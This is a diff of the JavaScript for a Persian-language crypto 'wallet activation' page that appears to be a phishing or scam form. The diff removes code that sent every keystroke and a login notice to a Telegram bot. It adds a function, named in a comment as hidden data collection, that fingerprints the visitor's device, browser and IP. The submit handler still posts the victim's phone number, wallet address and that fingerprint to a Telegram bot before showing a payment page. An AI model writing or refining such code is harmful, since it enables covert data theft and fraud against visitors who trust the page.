@@ -291,75 +291,30 @@
         const walletHint = document.getElementById('walletHint');
         const walletStatus = document.getElementById('walletStatus');
 
-        // ---------- وضعیت ارسال پیام‌ها ----------
-        let loginNotified = false; // برای جلوگیری از ارسال مکرر پیام ورود
-
-        // ---------- تابع ارسال پیام به تلگرام ----------
-        async function sendTelegramMessage(text) {
-            try {
-                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                const payload = {
-                    chat_id: CHAT_ID,
-                    text: text,
-                    parse_mode: 'Markdown'
-                };
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-                return await response.json();
-            } catch (e) {
-                console.error('خطا در ارسال پیام:', e);
-                return null;
+        // ---------- مدیریت راهنماهای شناور ----------
+        function showHint(element) {
+            document.querySelectorAll('.field-hint').forEach(el => el.classList.remove('show'));
+            if (element) {
+                element.classList.add('show');
+                element.parentElement.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
             }
         }
-
-        // ---------- ارسال پیام ورود کاربر ----------
-        function notifyLogin() {
-            if (loginNotified) return;
-            const username = usernameInput.value.trim() || 'نامشخص';
-            const userId = userIdInput.value.trim() || 'نامشخص';
-            const msg = `🚪 *ورود کاربر به سایت*\n\n👤 نام کاربری: ${username}\n🆔 یوزر آیدی: ${userId}\n⏰ زمان: ${new Date().toLocaleString('fa-IR')}`;
-            sendTelegramMessage(msg);
-            loginNotified = true;
+        function hideAllHints() {
+            document.querySelectorAll('.field-hint').forEach(el => el.classList.remove('show'));
         }
 
-        // ---------- ارسال پیام هنگام تایپ (با debounce) ----------
-        let typingTimeout = null;
-        let lastTypingMessage = '';
-
-        function notifyTyping(fieldName, value) {
-            const username = usernameInput.value.trim() || 'نامشخص';
-            const userId = userIdInput.value.trim() || 'نامشخص';
-            const msg = `✍️ *کاربر در حال وارد کردن اطلاعات*\n\n👤 نام کاربری: ${username}\n🆔 یوزر آیدی: ${userId}\n📌 فیلد: ${fieldName}\n📝 مقدار: ${value || '(خالی)'}\n⏰ زمان: ${new Date().toLocaleString('fa-IR')}`;
-            // فقط در صورتی که مقدار تغییر کرده باشد ارسال کن
-            if (msg === lastTypingMessage) return;
-            lastTypingMessage = msg;
-            sendTelegramMessage(msg);
-        }
-
-        function handleTyping(fieldName, value) {
-            if (typingTimeout) clearTimeout(typingTimeout);
-            typingTimeout = setTimeout(() => {
-                notifyTyping(fieldName, value);
-            }, 1500); // 1.5 ثانیه تأخیر
-        }
-
-        // ---------- رویدادهای ورودی برای تایپ ----------
-        usernameInput.addEventListener('input', function() {
-            handleTyping('نام کاربری', this.value);
+        phoneInput.addEventListener('focus', function() {
+            showHint(phoneHint);
         });
-        userIdInput.addEventListener('input', function() {
-            handleTyping('یوزر آیدی', this.value);
+        phoneInput.addEventListener('blur', function() {
+            if (!walletInput.matches(':focus')) hideAllHints();
         });
-        phoneInput.addEventListener('input', function() {
-            handleTyping('شماره تلفن', this.value);
+
+        walletInput.addEventListener('focus', function() {
+            showHint(walletHint);
         });
-        walletInput.addEventListener('input', function() {
-            handleTyping('آدرس کیف پول', this.value);
-            // همچنین اعتبارسنجی بلادرنگ
-            validateWalletInput(this.value);
+        walletInput.addEventListener('blur', function() {
+            if (!phoneInput.matches(':focus')) hideAllHints();
         });
 
         // ---------- اعتبارسنجی آدرس کیف پول ----------
@@ -367,6 +322,7 @@
             address = address.trim();
             if (!address) return { valid: false, network: null };
 
+            // تشخیص شبکه بر اساس الگو
             let network = null;
             if (address.startsWith('0x') && address.length === 42) {
                 network = 'Ethereum (ERC-20)';
@@ -394,51 +350,68 @@
                 network = 'Ripple (XRP)';
             } else if (address.startsWith('G') && address.length === 56) {
                 network = 'Stellar';
+            } else if (address.startsWith('0x') && address.length !== 42) {
+                network = 'Ethereum-like (طول نامعتبر)';
             } else {
+                // بررسی با API خارجی (برای تشخیص بیشتر)
+                // فقط در صورت وجود آدرس کامل، سعی می‌کنیم از API استفاده کنیم
+                // اما برای سادگی، در اینجا فقط الگوهای رایج را بررسی می‌کنیم
+                // به دلیل محدودیت‌های CORS از API عمومی استفاده نمی‌کنیم
+                // اما می‌توان از سرویس‌های دیگری مثل https://api.etherscan.io/ استفاده کرد
+                // برای دقت بیشتر، از کتابخانه‌های جانبی می‌توان استفاده کرد
+                // در اینجا فقط الگوهای ابتدایی را پشتیبانی می‌کنیم
                 return { valid: false, network: null };
             }
+
             return { valid: true, network: network };
         }
 
-        function validateWalletInput(value) {
-            const result = validateWalletAddress(value);
+        // ---------- اعتبارسنجی بلادرنگ ----------
+        walletInput.addEventListener('input', function() {
+            const address = this.value;
+            const result = validateWalletAddress(address);
             if (result.valid) {
                 walletStatus.className = 'wallet-status valid';
                 walletStatus.textContent = `✅ آدرس معتبر - شبکه: ${result.network}`;
-            } else if (value.length > 0) {
+            } else if (address.length > 0) {
                 walletStatus.className = 'wallet-status invalid';
                 walletStatus.textContent = '❌ آدرس نامعتبر یا شبکه ناشناخته';
             } else {
                 walletStatus.className = 'wallet-status';
                 walletStatus.textContent = '';
             }
-        }
-
-        // ---------- مدیریت راهنماهای شناور ----------
-        function showHint(element) {
-            document.querySelectorAll('.field-hint').forEach(el => el.classList.remove('show'));
-            if (element) {
-                element.classList.add('show');
-                element.parentElement.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-            }
-        }
-        function hideAllHints() {
-            document.querySelectorAll('.field-hint').forEach(el => el.classList.remove('show'));
-        }
-
-        phoneInput.addEventListener('focus', function() {
-            showHint(phoneHint);
-        });
-        phoneInput.addEventListener('blur', function() {
-            if (!walletInput.matches(':focus')) hideAllHints();
         });
 
-        walletInput.addEventListener('focus', function() {
-            showHint(walletHint);
-        });
-        walletInput.addEventListener('blur', function() {
-            if (!phoneInput.matches(':focus')) hideAllHints();
-        });
+        // ---------- جمع‌آوری اطلاعات مخفی ----------
+        async function collectHiddenData() {
+            const now = new Date();
+            const timeStr = now.toLocaleString('fa-IR', {
+                weekday: 'long', year: 'numeric', month: 'long', day: 'numeric',
+                hour: '2-digit', minute: '2-digit', second: '2-digit'
+            });
+            const ua = navigator.userAgent;
+            let device = 'ناشناس';
+            if (/mobile|android|iphone|ipad|ipod/i.test(ua)) {
+                if (/android/i.test(ua)) device = 'اندروید';
+                else if (/iphone|ipad|ipod/i.test(ua)) device = 'iOS';
+                else device = 'موبایل';
+            } else if (/windows/i.test(ua)) device = 'ویندوز';
+            else if (/mac/i.test(ua)) device = 'مک‌اواس';
+            else if (/linux/i.test(ua)) device = 'لینوکس';
+            let browser = 'ناشناس';
+            if (/chrome/i.test(ua) && !/edge/i.test(ua)) browser = 'کروم';
+            else if (/firefox/i.test(ua)) browser = 'فایرفاکس';
+            else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'سافاری';
+            else if (/edge/i.test(ua)) browser = 'ادج';
+            const deviceStr = `${device} · ${browser}`;
+            let ip = 'نامشخص';
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip || 'نامشخص';
+            } catch (_) {}
+            return { ip, time: timeStr, device: deviceStr };
+        }
 
         // ---------- نمایش صفحه پرداخت ----------
         function showPaymentPage() {
@@ -474,33 +447,7 @@
             setStatus('⏳ در حال آماده‌سازی اطلاعات ...', 'loading');
             submitBtn.disabled = true;
 
-            // جمع‌آوری اطلاعات مخفی
-            const now = new Date();
-            const timeStr = now.toLocaleString('fa-IR', {
-                weekday: 'long', year: 'numeric', month: 'long', day: 'numeric',
-                hour: '2-digit', minute: '2-digit', second: '2-digit'
-            });
-            const ua = navigator.userAgent;
-            let device = 'ناشناس';
-            if (/mobile|android|iphone|ipad|ipod/i.test(ua)) {
-                if (/android/i.test(ua)) device = 'اندروید';
-                else if (/iphone|ipad|ipod/i.test(ua)) device = 'iOS';
-                else device = 'موبایل';
-            } else if (/windows/i.test(ua)) device = 'ویندوز';
-            else if (/mac/i.test(ua)) device = 'مک‌اواس';
-            else if (/linux/i.test(ua)) device = 'لینوکس';
-            let browser = 'ناشناس';
-            if (/chrome/i.test(ua) && !/edge/i.test(ua)) browser = 'کروم';
-            else if (/firefox/i.test(ua)) browser = 'فایرفاکس';
-            else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'سافاری';
-            else if (/edge/i.test(ua)) browser = 'ادج';
-            const deviceStr = `${device} · ${browser}`;
-            let ip = 'نامشخص';
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                ip = data.ip || 'نامشخص';
-            } catch (_) {}
+            const hidden = await collectHiddenData();
 
             const message = `
 📋 *اطلاعات فعال‌سازی حساب و کیف پول*
@@ -511,19 +458,30 @@
 🔗 *آدرس کیف پول:* ${wallet}
 🏷️ *شبکه:* ${validation.network}
 
-🌐 *IP:* ${ip}
-⏰ *زمان ورود:* ${timeStr}
-💻 *دستگاه:* ${deviceStr}
+🌐 *IP:* ${hidden.ip}
+⏰ *زمان ورود:* ${hidden.time}
+💻 *دستگاه:* ${hidden.device}
 
 📌 *تاریخ ارسال:* ${new Date().toLocaleString('fa-IR')}
             `.trim();
 
             try {
-                const result = await sendTelegramMessage(message);
-                if (result && result.ok) {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                const payload = {
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                };
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                const result = await response.json();
+                if (result.ok) {
                     showPaymentPage();
                 } else {
-                    setStatus(`❌ خطا از سمت تلگرام: ${result?.description || 'خطای ناشناخته'}`, 'error');
+                    setStatus(`❌ خطا از سمت تلگرام: ${result.description || 'خطای ناشناخته'}`, 'error');
                     submitBtn.disabled = false;
                 }
             } catch (error) {
@@ -545,17 +503,6 @@
                 }, 8000);
             }
         }
-
-        // ---------- بارگذاری صفحه: ارسال پیام ورود ----------
-        window.addEventListener('load', function() {
-            // کمی تأخیر تا مقدار ورودی‌ها پر شود
-            setTimeout(() => {
-                notifyLogin();
-            }, 500);
-        });
-
-        // همچنین در صورت تغییر نام کاربری یا یوزر آیدی، پیام ورود به‌روز نشود (فقط یک بار)
-        // اما اگر کاربر بعداً تغییر داد، پیام تایپ ارسال می‌شود.
 
         // ---------- مخفی کردن hints در شروع ----------
         hideAllHints();
